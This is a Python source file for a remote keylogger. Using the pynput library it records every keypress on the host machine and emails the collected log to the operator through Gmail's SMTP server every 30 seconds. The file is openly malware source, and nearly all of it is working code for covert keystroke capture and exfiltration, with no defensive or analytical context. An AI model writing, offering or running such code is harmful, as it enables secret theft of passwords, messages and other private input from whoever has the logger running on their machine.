#!/usr/bin/env python
"""
Remote keylogger.
"""
import pynput.keyboard
import threading
import smtplib

class Keylogger:
    def __init__(self, interval, email, password):
        self.log = "[+] BEGIN LOG "
        self.interval = interval
        self.email = email
        self.password = password
    
    def mail_stdout(self, email, password, logfile):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, logfile)
        server.quit()
    
    def update_log(self, string):
        """
        Updates log.
        """
        self.log += string

    def process_keypress(self, key):
        """
        Allocates necessary handling to process each keypress.
        """
        try:
            ephemeral_key = str(key.char)
        except AttributeError:
            if (key == key.space):
                ephemeral_key = " "
            else:
                ephemeral_key = " " + str(key) + " "
        self.update_log(ephemeral_key)

    def report_log(self):
        """
        Opens thread to report log at n interval.
        """  
        self.mail_stdout(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report_log)
        timer.start()

    def start(self):
        """
        Instantiate a new listener obj and begin logger.
        """
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_keypress)
        with keyboard_listener:
            self.report_log()
            keyboard_listener.join()


new_logger = Keylogger(interval=30,email="",password="")
new_logger.start()